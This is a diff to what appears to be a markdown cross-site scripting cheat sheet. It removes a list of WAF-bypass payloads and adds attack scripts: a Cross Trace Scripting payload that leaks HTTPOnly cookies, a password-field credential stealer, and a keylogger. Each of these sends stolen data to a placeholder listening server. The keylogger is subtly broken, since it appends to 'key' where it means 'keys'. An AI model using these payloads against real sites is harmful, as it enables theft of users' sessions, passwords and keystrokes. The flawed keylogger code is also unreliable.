@@ -10,59 +10,6 @@ Polyglot field test
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 ```
 
-## WAF Bypass
-
-### Google Chrome Payloads
-
-#### Google XSS Audit Bypass
-
-```
-<svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a>
-```
-
-#### Chrome < v60 beta XSS-Auditor Bypass
-
-```
-<script src="data:,alert(1)%250A-->
-```
-
-#### Other Google Audit Bypass Payloads
-
-```
-<script>alert(1)</script
-<script>alert(1)%0d%0a-->%09</script
-<x>%00%00%00%00%00%00%00<script>alert(1)</script>
-```
-
-### Safari
-
-```
-<script>location.href;'javascript:alert%281%29'</script>
-```
-
-### Kona WAF (Akamai) Bypass&#xD;
-
-```
-<img src=x onerror=prompt(document.domain) onerror=prompt(document.domain) onerror=prompt(document.domain)>
-```
-
-### Wordfence&#x20;
-
-```
-<meter onmouseover="alert(1)"
-'">><div><meter onmouseover="alert(1)"</div>"
->><marquee loop=1 width=0 onfinish=alert(1)>
-```
-
-### Incapsula WAF
-
-```
-<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
-<img/src=q onerror='new Function`al\ert\`1\``'>
-```
-
-
-
 ## Exploits
 
 ### Cookie Stealing
@@ -71,11 +18,32 @@ Create an instance of server listening on a public port. After sending the follo
 
 ```
 <script>
-fetch('<server>', {
+fetch('<listening server>', {
 method: 'POST',
 mode: 'no-cors',
 body:document.cookie
 });
+</script>
+```
+
+### Cross Trace Scripting
+
+By default cookies with the HTTPOnly attribute set to true are invisible to browser scripts because they are sent only through GET or POST HTTP(S) requests. In order to obtain these cookie we make the user send a TRACE request to the server&#x20;
+
+```
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.withCredentials = true;
+req.open('TRACE','<URL>',true);        #putting \r\nTRACE instead of TRACE might bypass some option filters
+req.send();
+function handleResponse() {
+    fetch('<listening server>', {
+            method: 'POST',
+            mode: 'no-cors',
+            body: this.getAllResponseHeaders()
+        });
+};
 </script>
 ```
 
@@ -85,11 +53,33 @@ Create an instance of server listening on a public port. Send the following payl
 
 ```
 <input name=username id=username>
-<input type=password name=password onchange="if(this.value.length)fetch('<server>',{
+<input type=password name=password onchange="if(this.value.length)fetch('<listening server>',{
 method:'POST',
 mode: 'no-cors',
 body:username.value+':'+this.value
 });">
+```
+
+### Keylogging
+
+The following script sends the keys pressed by the user to the listening server
+
+```
+var keys = "";
+document.onkeypress = function(e){
+    var get = window.event ? event : e;
+    var key = get.keyCode ? get.keyCode : get.charCode;
+    key = String.fromCharCode(key);
+    key += key;
+}
+
+window.setInterval(function(){
+    if(keys && keys !== ""){
+        var path = encodeURI("<listening server>?keys="+keys);
+        new Image().src = path;
+        keys = "";
+    }
+},<log interval ms>);
 ```
 
 ### CSRF
